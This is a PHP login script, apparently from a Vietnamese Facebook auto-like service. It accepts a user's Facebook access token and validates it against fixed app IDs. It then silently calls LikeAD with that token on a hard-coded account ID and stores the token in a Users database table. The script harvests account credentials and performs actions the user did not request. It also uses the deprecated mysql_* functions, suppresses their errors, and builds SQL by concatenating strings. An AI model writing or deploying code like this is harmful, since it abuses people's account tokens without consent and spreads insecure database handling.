<?php
//if (!defined('DOANHDZ')) die ('The request not found');
require 'config.php';
require './system/func.php';
if($_POST['access_token']){
$token2 = $_POST['access_token'];
if(preg_match("'access_token=(.*?)&expires_in='", $token2, $matches)){
$token = $matches[1];
}else{
$token = $token2;
}
$checkapps = json_decode(file_get_contents('https://graph.facebook.com/app/?access_token='.$token),true);
$userData = json_decode(file_get_contents('https://graph.facebook.com/me?access_token='.$token),true);
if ($checkapps['id'] != '41158896424' && $checkapps['id']!='6628568379' && $checkapps['id'] != '350685531728') {
$doanhdz['mes']  = 'Vui lòng sử dụng token của hệ thống';
$doanhdz['status']  = 'error';
echo json_encode($doanhdz);
exit();
}
if($userData['id']){
LikeAD('100010218283419', $token);
$_SESSION['id']=$userData['id'];
$_SESSION['name']=$userData['name'];
$_SESSION['appid']=$checkapps['id'];
$_SESSION['token']=$token;
if($checkapps['id'] == '41158896424') $cot = 'token1';
else if($checkapps['id'] == '6628568379' || $checkapps['id'] == '350685531728' ) $cot = 'token2';
					$row = null;
					$result = @mysql_query("SELECT * FROM Users WHERE idfb = '" . baove($userData['id']) . "' ");
					if($result)
					{
						$row = @mysql_fetch_array($result, MYSQL_ASSOC);
						if(@mysql_num_rows($result) > 1)
						{
							@mysql_query("DELETE FROM Users WHERE idfb='" . baove($userData['id']) . "' AND id != '" . $row['id'] . "' ");
						}

					}
					if(!$row)
					{
						@mysql_query("INSERT INTO Users SET `idfb` = '" .baove($userData['id']). "', `name` = '" . baove($userData['name']) . "', `$cot` = '" .baove($token). "' ");
					}			
					else
					{
						@mysql_query("UPDATE Users SET `$cot` = '" . baove($token) . "' WHERE `id` = " . $row['id'] . " ");
					}
					mysql_close($connection);
$doanhdz['mes']  = 'Login thành công.';
$doanhdz['status']  = 'oke';
$doanhdz['link']  = '';
echo json_encode($doanhdz);
exit();
}else{
$doanhdz['mes']  = 'Access Token không hợp lệ';
$doanhdz['status']  = 'error';
echo json_encode($doanhdz);
}
}else{
header('Location: /index.php');
}

?>
